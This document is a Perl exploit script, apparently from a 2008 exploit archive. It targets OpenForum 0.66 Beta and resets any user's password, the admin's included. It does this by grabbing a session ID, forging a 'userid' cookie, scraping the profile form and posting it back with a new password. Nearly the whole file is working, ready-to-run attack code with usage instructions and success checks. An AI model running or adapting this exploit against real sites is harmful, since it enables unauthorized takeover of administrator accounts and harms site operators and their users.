@@ -1,0 +1,156 @@
+#!/usr/bin/perl -w
+#========================================================
+#OpenForum 0.66 Beta Remote Reset Admin Password Exploit
+#========================================================
+#
+#  ,--^----------,--------,-----,-------^--,
+#  |  |||||||||   `--------'    |	   O	  .. CWH Underground Hacking Team ..
+#  `+---------------------------^----------|
+#   `\_,-------, _________________________|
+#      / XXXXXX /`|     /
+#     / XXXXXX /  `\   /
+#    / XXXXXX /\______(
+#   / XXXXXX /           
+#  / XXXXXX /
+# (________(             
+#  `------'
+#
+#AUTHOR : CWH Underground
+#DATE : 29 November 2008
+#SITE : cwh.citec.us
+#
+#
+#####################################################
+#APPLICATION : OpenForum
+#VERSION : 0.66 Beta
+#DOWNLOAD : http://downloads.sourceforge.net/openforum/openforum066.zip
+######################################################
+#######################################################################################
+#Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
+#Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+#######################################################################################
+
+use LWP;
+use HTTP::Request;
+use HTTP::Request::Common;
+
+print "\n==================================================\n";
+print " Openforum 0.66 beta Remote Reset Admin Password exploit \n";
+print " \n";
+print " Discovered By CWH Underground \n";
+print "==================================================\n";
+print " \n";
+print " ,--^----------,--------,-----,-------^--, \n";
+print " | ||||||||| `--------' | O \n";
+print " `+---------------------------^----------| \n";
+print " `\_,-------, _________________________| \n";
+print " / XXXXXX /`| / \n";
+print " / XXXXXX / `\ / \n";
+print " / XXXXXX /\______( \n";
+print " / XXXXXX / \n";
+print " / XXXXXX / .. CWH Underground Hacking Team .. \n";
+print " (________( \n";
+print " `------' \n";
+print " \n";
+
+if ($#ARGV ne 2) {
+	print "Usage: ./openforum.pl <url-to-index-page> <user account> <new password>\n";
+	print "Ex. ./openforum.pl http://www.target.com/openforum/index.php admin cwhpass\n";
+	exit();
+}
+
+$url = $ARGV[0];
+$user = $ARGV[1];
+$newpass = $ARGV[2];
+
+if ($url !~ /^http:\/\//) {
+	$url = "http://".$url;
+}
+
+print "[+] Target url: ".$url."\n\n";
+
+$req = HTTP::Request->new (GET => $url);
+$req->header (User_Agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18');
+$req->header (Accept => 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5');
+$req->header (Accept_Language => 'en-us,en;q=0.5');
+
+$ua = LWP::UserAgent->new;
+$response = $ua->request ($req);
+
+if ($response->code ne 200) {
+	print "Error: Could not request for index page\n";
+	exit ();
+}
+
+$header = $response->headers->as_string;
+
+($sessid) = $header =~ /sessid=(.+)\n/;
+print ":: Retreive session id ::\n";
+print "[+] ".$sessid."\n\n";
+
+$url =~ s/index\.php$/profile.php?user=$user/;
+
+#print $url;
+
+
+
+$req = HTTP::Request->new (GET => $url);
+$req->header (User_Agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18');
+$req->header (Accept => 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5');
+$req->header (Accept_Language => 'en-us,en;q=0.5');
+$req->header (Cookie => 'sessid='.$sessid.'; userid='.$user);
+
+$response = $ua->request ($req);
+if ($response->code ne 200) {
+	print "Error: Could not request for ".$user."'s profile page\n";
+	exit ();
+}
+
+$content = $response->content;
+$update = "1";
+$adminaction = "";
+($email) = $content =~ /\"email\" value=\"(.*?)\"/;
+($signature) = $content =~ /\"signature\">(.*?)<\/textarea>/;
+$day = "";
+$month = "";
+$year = "";
+($website) = $content =~ /\"website\" value=\"(.*?)\"/;
+($name) = $content =~ /\"name\" value=\"(.*?)\"/;
+($phone) = $content =~ /\"phone\" value=\"(.*?)\"/;
+($city) = $content =~ /\"city\" value=\"(.*?)\"/;
+($location) = $content =~ /\"location\" value=\"(.*?)\"/;
+$sytle = "";
+$submit = "Update!";
+
+
+print ":: Update new password ::\n\n";
+$url =~ s/\?user=admin//;
+
+
+$response = $ua->request (POST $url,
+		User_Agent => 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18',
+		Accept => 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
+		Accept_Language => 'en-us,en;q=0.5',
+		Cookie => 'sessid='.$sessid.'; userid='.$user,
+		Content_Type => 'form-data',
+		Content => [update => $update, user => $user, adminaction => '', email => $email, signature => $signature, website => $website, name => $name,
+				phone => $phone, city => $city, location => $location, password => $newpass, submit => $submit]
+);
+
+if ($response->code ne 200) {
+	print "Error: Could not request for profile page\n";
+	exit ();
+}
+
+$content = $response->content;
+
+if ($content =~ /<br>updated<br><table width=\"100%\">/) {
+	print "[+] Exploit Success\n";
+	print "[+] New admin's password: ".$newpass."\n";
+}
+else
+{
+	print "[+] Exploit Failed\n";
+}
+
+# milw0rm.com [2008-11-29]
